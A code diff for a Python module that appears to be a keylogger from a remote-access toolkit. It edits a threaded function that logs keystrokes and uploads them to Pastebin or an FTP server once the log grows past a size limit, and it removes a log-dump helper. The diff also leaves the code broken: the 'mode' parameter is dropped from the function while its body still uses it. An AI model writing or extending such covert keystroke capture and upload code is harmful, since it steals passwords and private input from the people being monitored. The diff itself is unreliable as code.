@@ -12,6 +12,9 @@ import StringIO
 import threading
 import collections
 
+# packages
+import util
+
 # globals
 abort = False
 command = True
@@ -61,14 +64,15 @@ def _run():
         if globals()['abort']: break
 
 @util.threaded
-def auto(mode):
+def auto():
     """ 
-    Auto-upload to Pastebin or FTP server
+    Automatically log and upload keystrokes
+
     """
     while True:
         try:
             if globals()['logs'].tell() > globals()['max_size']:
-                result  = util.pastebin(globals()['logs']) if mode == 'pastebin' else util.ftp(globals()['logs'], filetype='.txt')
+                result = util.pastebin(globals()['logs']) if mode == 'pastebin' else util.ftp(globals()['logs'], filetype='.txt')
                 results.put(result)
                 globals()['logs'].reset()
             elif globals()['abort']:
@@ -78,15 +82,6 @@ def auto(mode):
         except Exception as e:
             util.log("{} error: {}".format(auto.func_name, str(e)))
             break
-
-def dump():
-    """
-    Dump the log results
-
-    """
-    result = globals()['logs'].getvalue()
-    globals()['logs'].reset()
-    return result
 
 def run():
     """ 
